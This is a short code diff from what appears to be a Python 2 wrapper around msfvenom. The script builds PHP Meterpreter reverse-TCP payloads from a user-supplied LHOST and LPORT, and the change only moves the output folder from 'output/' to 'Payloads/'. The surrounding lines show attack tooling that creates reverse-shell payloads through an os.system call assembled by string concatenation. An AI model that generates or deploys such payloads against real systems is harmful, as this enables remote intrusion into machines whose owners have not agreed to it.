@@ -148,9 +148,9 @@ def main(platform, type):
         payload= 'php/meterpreter/reverse_tcp'
         format= 'raw'
         extension= '.php'
-    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o output/'+output+extension)
+    os.system('msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o Payloads/'+output+extension)
     sleep(3)
-    if os.path.isfile('output/'+output+extension) == False:
+    if os.path.isfile('Payloads/'+output+extension) == False:
         head()
         raw_input('Oops , Something Went Wrong {0}(Hit Enter to continue){1}'.format(bold, end))
         choosepayload()
